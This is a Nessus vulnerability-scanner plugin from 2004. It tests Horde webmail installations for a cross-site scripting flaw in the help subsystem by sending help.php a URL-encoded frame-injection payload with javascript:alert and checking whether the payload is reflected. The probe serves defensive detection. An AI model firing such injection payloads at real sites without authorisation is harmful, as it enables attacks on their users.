#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(15605);
  script_version ("$Revision: 1.3 $"); 

# script_cve_id("CVE-MAP-NOMATCH");
# NOTE: no CVE id assigned (gat, 10/2004)
  script_bugtraq_id(11546);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"11164");
  }

  name["english"] = "Horde Help Subsystem XSS";
  script_name(english:name["english"]);

  desc["english"] = "

The target is running at least one instance of Horde in which the
help subsystem is vulnerable to a cross site scripting attack since
information passed to the help window is not properly sanitized.

Solution : Upgrade to Horde version 2.2.7 or later.
                                                                                
Risk factor : Low";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Help Subsystem XSS flaw in Horde";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "CGI abuses : XSS";
  script_family(english:family["english"]);

  script_dependencie("global_settings.nasl", "horde_detect.nasl");

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);
if (debug_level) display("debug: searching for Help Subsystem XSS flaw in Horde on ", host, ":", port, ".\n");

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/horde"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    url = string(
      dir, 
      # nb: if you change the URL, you probably need to change the 
      #     pattern in the egrep() below.
      "/help.php?show=index&module=nessus%22%3E%3Cframe%20src=%22javascript:alert(42)%22%20"
    );
    if (debug_level) display("debug: retrieving ", url, "...\n");
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if (isnull(res)) exit(0);           # can't connect
    if (debug_level) display("debug: res =>>", res, "<<\n");

    if (egrep(string:res, pattern:'frame src="javascript:alert')) {
      security_warning(port);
      exit(0);
    }
  }
}
